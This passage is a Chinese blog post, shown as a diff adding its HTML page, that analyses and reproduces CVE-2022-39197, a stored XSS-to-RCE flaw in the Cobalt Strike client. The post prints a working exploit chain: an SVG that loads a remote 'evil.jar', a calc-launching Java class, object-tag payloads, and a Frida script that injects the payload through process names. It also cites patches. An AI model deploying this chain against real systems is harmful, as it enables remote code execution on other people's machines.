@@ -1,0 +1,890 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="keep something">
+  <meta name="author" content="luom">
+  <meta name="keywords" content="">
+  <title>CobaltStrike 存储型XSS-RCE（CVE-2022-39197) - RC9&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"romanc9.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"nC7Rtx8EoAwWlShCEwdRsumO-gzGzoHsz","app_key":"sqlnn9nfpy9eU5bkSY3Rpkyb","server_url":"https://nc7rtx8e.lc-cn-n1-shared.com"}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Romanc9's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CobaltStrike 存储型XSS-RCE（CVE-2022-39197)">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-03-15 20:00" pubdate>
+        2023年3月15日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.3k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      76
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CobaltStrike 存储型XSS-RCE（CVE-2022-39197)</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2024年2月16日 晚上
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h2 id="cs简介">0.cs简介</h2>
+<p>Cobalt Strike (CS)
+是一个为对手模拟和红队行动而设计的平台，相当于增强版的Armitage，早期以Metasploit为基础框架，3.0版本之后作为独立平台开发，主要用于目标攻击和模拟后渗透行动。CS集成了端口转发、服务扫描、端口监听、木马生成、钓鱼攻击等功能，可以调用Mimikatz、Psexec等工具，与MSF进行联动，使用插件扩展功能，并且可以利用Malleable
+C2 profile
+自定义通信流量特征，是内网大杀器，十分适合作为团队协同攻击工具使用</p>
+<p>Cobalt Strike使用C/S架构，Cobalt
+Strike的客户端连接到团队服务器，团队服务器连接到目标，也就是说Cobalt
+Strike的客户端不与目标服务器进行交互</p>
+<h2 id="漏洞原因">1.漏洞原因</h2>
+<p>由于Cobalt Strike 使用 GUI 框架
+SWING开发，未经身份验证的远程攻击者可通过在 beacon 元数据中注入恶意 HTML
+标签，使得CS对其进行解析时加载恶意代码，从而在目标系统上执行任意代码实现rce</p>
+<p>即==》攻击者在Beacon配置中设置格式错误的用户名，借此实现
+实现远程执行代码</p>
+<p>漏洞危害：</p>
+<p>​ 1.用户获取到使用Cobalt Strike的攻击者的木马样本后，反制正在使用
+Cobalt Strike 客户端的攻击者</p>
+<p>​ 2.导致命令执行，服务器被入侵</p>
+<p>​ 3.内网被渗透，导致数据被窃取等风险</p>
+<p>影响版本：Cobalt Strike &lt;= 4.7</p>
+<p>修补：</p>
+<p>==》升级版本之后即避免漏洞产生，也可以通过打补丁方式防御漏洞：https://github.com/burpheart/CVE-2022-39197-patch</p>
+<p>启动客户端的时候加入agent参数防止渲染html,具体原理参考后文</p>
+<p>官方通报：</p>
+<p>https://www.cobaltstrike.com/blog/out-of-band-update-cobalt-strike-4-7-1/</p>
+<h2 id="漏洞原理">2.漏洞原理</h2>
+<p>参考：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098978&amp;idx=1&amp;sn=d511d5a674d84eeaf262c8e389ae0403&amp;scene=21#wechat_redirect">漂亮鼠大佬复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/347221.html">最新CS
+RCE（CVE-2022-39197）复现心得分享</a></p>
+<p>https://cloud.tencent.com/developer/article/2220765</p>
+<p>https://forum.butian.net/share/1934</p>
+<p>https://mp.weixin.qq.com/s/fZtDvpyAo-UZRE9MhfB0VQ?ref=www.ctfiot.com</p>
+<p>https://www.shangyexinzhi.com/article/5240616.html</p>
+<p>https://xz.aliyun.com/t/11815#toc-5</p>
+</blockquote>
+<h3 id="swing的xss漏洞源码分析">2.1 Swing的XSS漏洞源码分析</h3>
+<p>Swing解析HTML标签原理流程：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221647108.png" srcset="/img/loading.gif" alt="Swing解析HTML标签流程图" style="zoom:50%;"></p>
+<p>具体解析细节：Swing规定：开头引入<code>&lt;html&gt;</code>标签就会对其中内容进行HTML渲染解析，测试JLabel的setText()方法设置标签内容为HTML代码，能实现在标签中显示图片:</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221650435.png" srcset="/img/loading.gif" alt="Swing的HTML特性" style="zoom:50%;"></p>
+<p>​
+1）分析Swing源码，JDK的运行环境文件rt.jar，分析javax-swing-text-html包，javax代表“Java扩展”</p>
+<p>​
+2）查看HTML类：定义了一些标签和属性常量。使用HTML标签属性作为参数，实例化多个Tag对象并存储在allTags数组中</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231746185.png" srcset="/img/loading.gif" alt="HTML类里定义的标签" style="zoom:50%;"></p>
+<p>​
+3）HTMLDocument类：定义了一系列标签对应的Action，这些Action用于处理HTML文档中的标签，例如插入图片、插入超链接等</p>
+<p>​
+4）HTMLEditorKit类：将HTML文本输出为可编辑文本，根据传入的参数（即不同的标签）创建一个对应的HTML元素对象，并将传入的属性和内容设置到该元素对象中。例如，如果传入的标签名是"div"，则该方法会创建一个div元素对象，并将传入的属性和内容设置到该对象中。该方法返回创建的HTML元素对象</p>
+<p>​
+5）HiddenTagView类：一种特殊的视图对象，用于隐藏标签，如<code>&lt;input type="hidden"&gt;</code>，不会显示在界面中</p>
+<p>​
+6）HTMLEditorKit类中处理script标签:解析html时，虽然HTML类定义了script标签<strong>但不会执行Java
+Script代码</strong>，即并不能引入外部js文件实现常规的Java Script
+XSS（跨站脚本漏洞），而是直接隐藏，不会解析</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221653426.png" srcset="/img/loading.gif" alt="HTMLEditorKit类中对script标签的处理" style="zoom:50%;"></p>
+<h3 id="xss到实例化任何类">2.2 XSS到实例化任何类</h3>
+<p>漏洞里实例化任何类入口的源码逻辑图：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401221656007.png" srcset="/img/loading.gif" alt="实例化任何类入口的源码逻辑" style="zoom:50%;"></p>
+<p>具体研究细节：</p>
+<p>​
+分析HTML类定义的OBJECT标签和HTMLDocument.HTMLReader定义的ObjectAction。HTMLEditorKit会返回ObjectView类。</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231742641.png" srcset="/img/loading.gif" alt="HTMLEditorKit类解析不同标签" style="zoom:50%;"></p>
+<p>​</p>
+<p>​
+ObjectView类：在HTML文档中显示对象，将数据对象呈现为Swing组件。ObjectView尝试加载分类属性指定的object。如果类可以成功加载，将尝试通过调用class.new实例来创建它的实例。即ObjectView是一个用于创建符合特定要求的类实例的工具，它可以通过参数传递来初始化这些实例，<strong>类似反序列化的功能</strong>。<strong><u>那么，通过使用object标签，我们可以实现动态实例化符合要求的类，并通过param标签传递参数，从而实现任意加载</u></strong>。基于这个入口，这种方法不仅可以用于加载图片，还可以应用于实例化
+任意类的场景。<strong>同时，该类声明了object标签使用模版：</strong></p>
+<pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">object</span> classid=&quot;javax.swing.JLabel&quot;&gt;
+&lt;param <span class="hljs-type">name</span>=&quot;text&quot; <span class="hljs-keyword">value</span>=&quot;sample text&quot;&gt;
+&lt;/<span class="hljs-keyword">object</span>&gt;</code></pre>
+<p>漏洞入口ObjectView类的部分源码：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231739952.png" srcset="/img/loading.gif" alt="漏洞入口ObjectView类的部分源码" style="zoom:50%;"></p>
+<p>调用原理：</p>
+<p>​
+1）ObjectView类里的源码：这里获取当前元素的属性集合，然后从属性集合中获取CLASSID属性的值。接着使用Java反射机制加载该类，并创建一个实例对象，并通过调用setParameters设置参数。这个类必须有无参的构造方法且类继承于Component类，否则抛出异常。</p>
+<p>​ 2）setParameters方法源码分析：</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231751208.png" srcset="/img/loading.gif" alt="setParameters方法的部分源码" style="zoom:50%;"></p>
+<p>​
+方法需要两个参数：<u>一个Component对象和一个AttributeSet对象</u>。首先，获取组件的类信息，然后获取该类的所有属性的描述器数组，接着，它遍历属性描述器数组，取出所有属性参数然后循环判断哪些属性参数和标签传入值一致。如果找到了匹配的属性参数，它会将该参数的值转换为字符串，并尝试调用属性描述器的写方法来设置组件的属性值。如果属性不可写或者参数数量不止一个且不为string，它会忽略该标签传入值。最后反射执行对应方法。</p>
+<p>​
+3）怎么判断属性是否可写：通过看它是否有对应的set方法，如一个属性是Name，那就看这个类有没有setName方法</p>
+<p>​ <strong>总结下来ObjectView类要求</strong>：</p>
+<p>(1)通过参数classid传入需要实例化的类，类必须继承于Component。</p>
+<p>(2)类必须有无参构造方法。</p>
+<p>(3)类属性可写，即属性必须存在一个对应的set方法。</p>
+<p>(4)set方法的参数必须是一个string类型。</p>
+<p>​ 而<strong>JLabel</strong>：是Java
+Swing中的一个类，用于在GUI（图形用户界面）上显示文本或图像，继承于Component。JLabel不需要任何参数来创建对象，有无参数构造方法：public
+JLabel() {this("", null,
+LEADING);}。并且有text属性和需要String参数的setText方法，满足ObjectView类要求：public
+void setText(String text)。</p>
+<p>​ 那么尝试构造：</p>
+<p><code>&lt;html&gt;&lt;object classid='javax.swing.JLabel'&gt;&lt;param name='Text' value='test'&gt;</code></p>
+<p>​ 执行效果如图:</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231753207.png" srcset="/img/loading.gif" alt="JLabel的object注入" style="zoom:50%;"></p>
+<p>​
+JLabel的setText()方法可以实现object注入，<strong>但只能用于设置标签的文本内容</strong>。它接受一个字符串参数，该字符串将被显示在标签上，只能用于显示静态的文本信息，并不会解析执行代码，如JavaScript代码。</p>
+<p>​
+后续研究方向：从lib包里寻找符合条件的类和方法以最终实现执行远程代码</p>
+<h3 id="寻找rce利用链">2.3 寻找RCE利用链</h3>
+<p>​
+在需要满足类继承于Component、包含无参的构造方法、类中有一个set方法，该方法只接受一个String类型的参数的条件下，分析得出Swing本身的库满足以上条件的大多为<u>参数预处理功能</u>，与代码执行无关</p>
+<p>​ 继而分析Cobalt
+Strike源码jar包，发现org.apache.batik.swing.JSVGCanvas类的setURI方法配合漏洞可以实现远程代码执行</p>
+<p>​ Apache
+Batik是一个开源的SVG工具包，它提供了一组Java类库，用于处理SVG文档、转换SVG文档为其他格式（如PNG、JPEG等）、显示SVG文档等。而org.apache.batik.swing.JSVGCanvas是一个Java
+Swing组件，用于显示和操作可缩放矢量图形（SVG）文件</p>
+<p>​
+<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231755913.png" srcset="/img/loading.gif" alt="JSVGCanvas类的setURI方法" style="zoom:50%;"></p>
+<p>​
+1）JSVGCanvas类其中的setURI方法接受一个字符串类型参数var1。这个方法实际上是用来设置uri属性的。将uri属性设置为传递进来的var1参数。如果uri不为null，就调用loadSVGDocument方法加载传入的SVG文档。那这个setURI方法的可控输入就为SVG文档</p>
+<p>​
+2）而SVG文档是一种基于xml的矢量图形格式，用于描述二维图形和动画。它可以在各种设备和平台上显示，并且<strong>可以通过CSS和JavaScript进行样式和交互控制</strong></p>
+<p>​ 3）虽然SVG文档支持JavaScript，<strong>但这里Cobalt
+Strike环境不能执行JavaScript代码</strong>，执行报错，分析在batik.bridge.BaseScriptingEnvironment.loadScripts函数，👇</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231756440.png" srcset="/img/loading.gif" alt="loadScripts类部分源码" style="zoom:50%;"></p>
+<p><strong>发现所需条件</strong>：</p>
+<p>(1)type需为application/java-archive</p>
+<p>(2)String href =
+XLinkSupport.getXLinkHref(script);读取namespaceURL为http://www.w3.org/1999/xlink的href属性的内容，如果没读到，这里href的值为空字符串。</p>
+<p>(3)getBaseURI()用来获取SVG数据源的URL，作为参数传给ParsedURL对象。</p>
+<p>(4)checkCompatibleScriptURL：实际调用DefaultScriptSecurity方法，要求远程SVG文件和远程jar包地址host相同。</p>
+<p>(5)DocumentJarClassLoader是URLClassLoader的封装，URLClassLoader的作用是加载远程jar包。第一个参数指定了远程jar包的地址，实际为创建ParsedURL对象时的第二个参数href，即xlink:href属性内容。</p>
+<p>(6)远程jar包需包含META-INF/MANIFEST.MF文件，且其中Script-Handler的值为需要远程加载类的类名。</p>
+<p>(7)getMainAttributes()方法返回该Jar文件的主清单文件的Attributes对象，getValue("Script-Handler")方法返回该Attributes对象中名为"Script-Handler"的属性的值，也就是类名，将其赋值给变量var13。</p>
+<p>(8)变量var26将动态加载类var13，并实例化为ScriptHandler类型的对象。那么由于var13可控，那么我们就可以通过这种方式来构造远程代码执行</p>
+<p>​ 那么准备SVG文件： <pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.w3.org/2000/svg&quot;</span></span>
+<span class="hljs-tag">    <span class="hljs-attr">xmlns:xlink</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/xlink&quot;</span></span>
+<span class="hljs-tag">    <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;application/java-archive&quot;</span> <span class="hljs-attr">xlink:href</span>=<span class="hljs-string">&quot;http://xxx/evil.jar&quot;</span>/&gt;</span>
+<span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">text</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span></span></span></code></pre>
+准备实现远程代码执行功能的恶意jar包，测试功能：针对不同系统弹出计算器，代码如下
+<pre><code class="hljs reasonml">import java.io.IOException;
+public <span class="hljs-keyword">class</span> Exp &#123;
+    public <span class="hljs-constructor">Exp()</span> throws IOException &#123;
+        String os = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-string">&quot;os.name&quot;</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">LowerCase()</span>;
+        <span class="hljs-keyword">if</span>(os.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;mac&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>)&#123;
+            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;open -na Calculator&quot;</span>);
+        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(os.index<span class="hljs-constructor">Of(<span class="hljs-string">&quot;windows&quot;</span>)</span>&gt;=<span class="hljs-number">0</span>)&#123;
+            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);
+        &#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span>.exec(<span class="hljs-string">&quot;calc.exe&quot;</span>);&#125;&#125;&#125;</code></pre> payload： <pre><code class="hljs routeros">&lt;html&gt;&lt;object <span class="hljs-attribute">classid</span>=<span class="hljs-string">&#x27;org.apache.batik.swing.JSVGCanvas&#x27;</span>&gt;&lt;param name= <span class="hljs-string">&#x27;URI&#x27;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&#x27;http://xxx/test.svg&#x27;</span>&gt;</code></pre></p>
+<p><strong>那么总结RCE调用链流程图如下👇</strong></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231801157.png" srcset="/img/loading.gif" alt="RCE利用链流程图" style="zoom:50%;"></p>
+<h3 id="反制原理">2.4 反制原理</h3>
+<p>​ Cobalt
+Strike会话上线的beacon元数据里的用户名、主机名、操作系统信息等都是有长度限制的，由RSA加密，且能修改的部分只有user、computer、process字段，想要插入有效<code>&lt;html&gt;</code>标签的payload，可以从后续通信的AES数据入手，beacon和teamserver之间的通信分为两个阶段，第一个阶段是上线包的RSA加密，第二个阶段是后续命令下发的AES加密。在第二个阶段中，我们可以注入进程名称数据来绕过元数据的长度限制，进行XSS攻击，进一步实现远程代码执行。</p>
+<p>​
+而注入进程名可以通过Python的Frida实现(Frida是一种动态插桩工具，可以在运行时修改和监视应用程序的行为。多用于应用程序的逆向工程、漏洞分析、安全测试等方面)。当攻击者试图对会话执行列出进程，反制者通过Frida注入应用程序修改返回的进程名称为精心构造的payload，攻击者浏览到该进程名，远程代码执行则会实现</p>
+<p>​ 1) exp Python文件关键代码： <pre><code class="hljs routeros">pid = frida.spawn(target)  
+session = frida.attach(pid) 
+script = session.create_script(frida_script) 
+script.load() 
+frida.resume(pid)
+frida.kill(pid)</code></pre> ​
+使用Frida库在设备上启动一个进程，并返回该进程的进程ID（PID）。target
+是要启动的进程的名称或者路径。然后attach连接这个运行的进程。这个函数会返回一个
+session，表示与目标进程的连接会话。通过这个会话，在目标进程中执行JavaScript代码，或者使用Frida提供的API来进行各种操作。这里将Frida脚本加载到目标进程，使目标进程开始执行Frida脚本中的代码，最后终止该进程</p>
+<p>​ 2)Frida部分脚本代码: <pre><code class="hljs javascript"><span class="hljs-keyword">var</span> pProcess32Next = Module.findExportByName(<span class="hljs-string">&quot;kernel32.dll&quot;</span>, <span class="hljs-string">&quot;Process32Next&quot;</span>) 
+Interceptor.attach(pProcess32Next, &#123;
+        onEnter: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">args</span>) </span>&#123;
+            <span class="hljs-built_in">this</span>.pPROCESSENTRY32 = args[<span class="hljs-number">1</span>];
+            <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">Process.arch == <span class="hljs-string">&quot;ia32&quot;</span></span>)</span>&#123;<span class="hljs-built_in">this</span>.exeOffset = <span class="hljs-number">36</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-built_in">this</span>.exeOffset = <span class="hljs-number">44</span>;&#125;
+            <span class="hljs-built_in">this</span>.szExeFile = <span class="hljs-built_in">this</span>.pPROCESSENTRY32.add(<span class="hljs-built_in">this</span>.exeOffset);&#125;,
+        onLeave: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">retval</span>) </span>&#123;
+            <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params"><span class="hljs-built_in">this</span>.szExeFile.readAnsiString() == <span class="hljs-string">&quot;beacon.exe&quot;</span></span>)</span> &#123;
+                send(<span class="hljs-string">&quot;[!] Found beacon, injecting payload&quot;</span>);
+                <span class="hljs-built_in">this</span>.szExeFile.writeAnsiString(payload);&#125;&#125;&#125;)</code></pre></p>
+<p>​
+在kernel32.dll模块中查找并获取Process32Next函数的地址，并将其赋值给变量pProcess32Next。Process32Next函数是Windows系统中的一个API函数，用于枚举进程信息。Frida中使用这个函数来获取正在运行的进程的信息。然后用Interceptor.attach()方法拦截函数调用。</p>
+<p>​
+然后根据当前进程的架构（32位或64位）来设置偏移量的值。不同架构的操作系统，可执行文件在PE文件格式中的偏移量不同。接着根据偏移量定位可执行文件名称。Windows系统的进程信息结构体PROCESSENTRY32中的szExeFile成员变量存储了进程的可执行文件名称，那么获取该成员的地址并将其赋值给变量this.szExeFile。</p>
+<p>​ 通过readAnsiString()
+方法读取进程的可执行文件名称。判断是否为“beacon.exe”。如果是，则使用this.szExeFile.writeAnsiString(payload)将payload注入到该进程中，最后使用send函数将注入操作的结果发送给Frida客户端。【后续也可将文件名设置为变量】</p>
+<p>​ 3）<strong>总结</strong>：EXP通过在 Windows 操作系统中拦截
+Process32Next
+函数的调用，并在进程列表中查找名为beacon.exe的进程，如果找到了该进程，就会注入进程，修改进程名为payload代码</p>
+<h2 id="漏洞复现">3.漏洞复现</h2>
+<p>参考：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkyMDE4NzE1Mw==&amp;mid=2247484355&amp;idx=1&amp;sn=1d2df2c1eac378875fe1c0d408478979&amp;scene=21#wechat_redirect">简单复现</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/1FUvdOqmDPcFptlfkDk-rg">简单2</a></p>
+<p>poc: https://github.com/its-arun/CVE-2022-39197</p>
+<p>https://blog.csdn.net/qq_50854662/article/details/129181019</p>
+</blockquote>
+<h3 id="漏洞自查">3.1 漏洞自查</h3>
+<p>​ 受该漏洞影响的版本:Cobalt Strike &lt;= 4.7 ​ 连接Cobalt
+Strike服务端，启动Cobalt Strike客户端。 ​
+客户端配置监听器，名称处输入以下代码：</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&#x27;org.apache.batik.swing.JSVGCanvas&#x27;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&#x27;URI&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;http://xxx/a.svg&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></code></pre>
+<p>​
+代码含义：创建一个SVG画布对象。classid属性指定要使用的Java类库，这里是Apache
+Batik的SVG画布类org.apache.batik.swing.JSVGCanvas。这个类库可以在Java应用程序中显示和操作SVG图像。<code>&lt;param&gt;</code>标记用于传递参数给SVG画布对象，这里的参数是SVG图像的URL地址，
+URI value处设置为DNSlog地址，查看DNSlog记录判断Cobalt
+Strike能否远程访问，<strong>注意：这里的URI必须以http://开头否则Swing无法解析地址,如图</strong></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202401231810438.png" srcset="/img/loading.gif" alt="SVG解析地址报错" style="zoom:50%;"></p>
+<p>1）payload选项默认，这里用dnslog原理测试漏洞是否存在</p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021828187.png" srcset="/img/loading.gif" alt="配置监听器" style="zoom:50%;"></p>
+<p>2）点击保存，客户端会触发HTTP访问，查看DNSlog是否有访问记录即可判断是否有漏洞，<u>这里本地Cobalt
+Strike存在该漏洞</u></p>
+<p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202402021828841.png" srcset="/img/loading.gif" alt="本地自查Cobalt Strike存在漏洞" style="zoom:50%;"></p>
+<p>3）进一步本地验证能否触发远程代码执行漏洞：名称处的URI
+value修改为本地端口9898搭建的SVG文件地址。</p>
+<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">object</span> <span class="hljs-attr">classid</span>=<span class="hljs-string">&#x27;org.apache.batik.swing.JSVGCanvas&#x27;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>= <span class="hljs-string">&#x27;URI&#x27;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#x27;http://127.0.0.1:9898/evil.svg&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">object</span>&gt;</span></code></pre>
+<p>4）提前准备的SVG文件内容：表示一个SVG图像，其中SVG脚本元素包含一个指向一个jar包的超链接，并将其作为脚本引入SVG图形中，SVG被触发会访问远程jar包</p>
